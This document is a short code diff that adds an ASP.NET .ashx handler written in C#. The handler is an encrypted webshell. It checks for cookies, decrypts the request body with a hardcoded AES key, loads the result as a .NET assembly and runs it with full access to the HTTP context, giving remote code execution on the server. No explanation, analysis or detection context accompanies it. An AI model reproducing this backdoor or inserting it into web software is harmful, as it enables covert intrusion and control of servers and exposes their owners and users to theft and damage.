@@ -1,0 +1,3 @@
+<%@ WebHandler Language="C#" Class="D" %>
+using System.Web;using System.Text;
+public class D:IHttpHandler{public void ProcessRequest(HttpContext x){if(x.Request.Cookies.Count!=0){byte[] k=System.Text.Encoding.Default.GetBytes("ca63457538b9b1e0"),c=x.Request.BinaryRead(x.Request.ContentLength);System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k,k).TransformFinalBlock(c,0,c.Length)).CreateInstance("K").Equals(x);};}public bool IsReusable{get{return false;}}}
